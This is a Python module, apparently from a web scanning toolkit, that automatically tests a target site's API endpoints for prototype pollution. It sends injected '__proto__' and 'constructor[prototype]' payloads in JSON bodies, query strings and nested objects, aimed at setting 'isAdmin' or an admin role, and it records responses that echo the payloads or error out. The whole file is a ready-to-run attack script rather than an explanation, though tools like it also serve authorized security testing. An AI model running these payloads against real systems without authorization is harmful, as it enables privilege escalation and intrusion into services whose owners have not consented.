"""Prototype Pollution — __proto__ / constructor injection"""
from core.config import PROTO_PAYLOADS, PROTO_PARAMS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, http_post, save_report, vuln

ENDPOINTS = ["/api/user", "/api/users", "/api/profile", "/api/settings",
             "/api/config", "/api/data", "/api/merge", "/api/update",
             "/api/admin", "/api/account"]

def run(target):
    print(f"\n{B2}  Prototype pollution test on {W}{target}{N}")
    vulns = 0; findings = []

    # Check if target reflects __proto__ pollution
    print(f"\n{D}  Testing JSON body pollution...{N}")
    for ep in ENDPOINTS:
        url = target + ep
        for payload in PROTO_PAYLOADS:
            code, body = http_post(url, payload, timeout=8)
            if code == 0: continue

            # Check for pollution indicators
            if "polluted" in body or "isAdmin" in body:
                vuln("CRITICAL", "Prototype pollution reflected!", f"Payload echoed", url)
                vulns += 1; findings.append({"type":"proto_reflect","url":url,"payload":payload})
                break

            # Check for 500 errors (possible gadget chain)
            if code == 500 and ("TypeError" in body or "Cannot set" in body or
                                 "prototype" in body.lower()):
                vuln("HIGH", "Prototype pollution error!", "Server may be vulnerable", url)
                vulns += 1; findings.append({"type":"proto_error","url":url})
                break

    # Query string pollution
    print(f"\n{D}  Testing query string pollution...{N}")
    qs_payloads = [
        "?__proto__[isAdmin]=true",
        "?__proto__[polluted]=yes",
        "?constructor[prototype][isAdmin]=true",
        "?__proto__.isAdmin=true",
    ]
    for ep in ENDPOINTS[:5]:
        for qs in qs_payloads:
            url = target + ep + qs
            code, hdrs, body = http_get(url, timeout=7)
            if code == 0: continue
            if "polluted" in body or ("isAdmin" in body and "true" in body):
                vuln("CRITICAL", "Query string prototype pollution!", url)
                vulns += 1; findings.append({"type":"proto_qs","url":url})
                break

    # Nested parameter pollution
    print(f"\n{D}  Testing nested parameter pollution...{N}")
    for ep in ENDPOINTS[:3]:
        url = target + ep
        nested = '{"user":{"__proto__":{"role":"admin"}}}'
        code, body = http_post(url, nested, timeout=8)
        if code in (200, 201) and "admin" in body.lower():
            vuln("CRITICAL", "Nested prototype pollution → admin!", url)
            vulns += 1; findings.append({"type":"proto_nested","url":url})

    print(f"\n{G}  [✓] Prototype pollution scan done — {vulns} findings{N}")
    if findings: save_report("proto_pollute", {"target":target,"findings":findings})
    return vulns
